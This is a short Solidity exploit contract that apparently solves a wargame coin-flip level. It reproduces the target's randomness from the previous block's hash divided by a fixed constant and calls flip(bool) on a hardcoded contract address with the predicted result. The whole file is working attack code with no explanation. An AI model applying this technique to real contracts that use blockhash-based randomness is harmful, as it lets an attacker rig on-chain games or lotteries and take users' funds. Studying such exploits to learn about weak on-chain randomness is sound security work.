pragma solidity ^0.6.0;
contract exp{
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address target=0x10a7381F368AdBeB774B4cF15576DBCD5CB8819E;
    function c() public{
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue/FACTOR;
        bool side= coinFlip == 1 ? true : false;
        bytes memory payload = abi.encodeWithSignature("flip(bool)",side);
        (bool success, bytes memory returnData) = address(target).call(payload);
    }
}